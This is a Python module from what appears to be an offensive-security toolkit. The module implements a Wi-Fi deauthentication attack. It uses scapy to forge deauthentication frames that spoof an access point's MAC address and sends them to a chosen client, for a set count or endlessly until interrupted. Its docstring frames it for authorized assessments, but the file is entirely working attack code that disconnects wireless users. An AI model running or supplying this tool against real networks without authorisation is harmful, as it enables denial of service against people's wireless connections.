"""Send Wi-Fi deauthentication frames for authorized assessments."""

import argparse
import math
from typing import List

from zer0specter.utils.logger import get_logger
from zer0specter.utils.validators import validate_mac_address


def wifi_attack(argus: List[str]) -> int:
    parser = argparse.ArgumentParser(description="Wi-Fi deauthentication test")
    parser.add_argument(
        "-i", "--interface", required=True, help="wireless interface in monitor mode"
    )
    parser.add_argument("-a", "--ap", dest="ap_mac", required=True, help="AP MAC")
    parser.add_argument(
        "-c", "--client", dest="client_mac", required=True, help="client MAC"
    )
    parser.add_argument(
        "-n",
        "--count",
        type=int,
        default=10,
        help="packet count; 0 runs until interrupted",
    )
    parser.add_argument(
        "--interval", type=float, default=0.1, help="seconds between packets"
    )
    args = parser.parse_args(argus)
    logger = get_logger()

    if not validate_mac_address(args.ap_mac):
        parser.error("AP MAC address is invalid")
    if not validate_mac_address(args.client_mac):
        parser.error("client MAC address is invalid")
    if args.count < 0:
        parser.error("count must be zero or greater")
    if not math.isfinite(args.interval) or args.interval <= 0:
        parser.error("interval must be a finite positive number")

    try:
        from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp
    except Exception as error:
        logger.error("Could not load Wi-Fi packet support (%s)", type(error).__name__)
        return 1

    packet = (
        RadioTap()
        / Dot11(addr1=args.client_mac, addr2=args.ap_mac, addr3=args.ap_mac)
        / Dot11Deauth(reason=7)
    )
    if args.count == 0:
        logger.info("Sending deauthentication frames until interrupted")
        send_args = {"loop": 1}
    else:
        logger.info("Sending %s deauthentication frames", args.count)
        send_args = {"count": args.count}

    try:
        sendp(
            packet,
            iface=args.interface,
            inter=args.interval,
            verbose=False,
            **send_args,
        )
    except KeyboardInterrupt:
        logger.warning("Wi-Fi transmission interrupted by user")
        return 130
    except Exception as error:
        logger.error("Wi-Fi transmission failed (%s)", type(error).__name__)
        return 1
    return 0
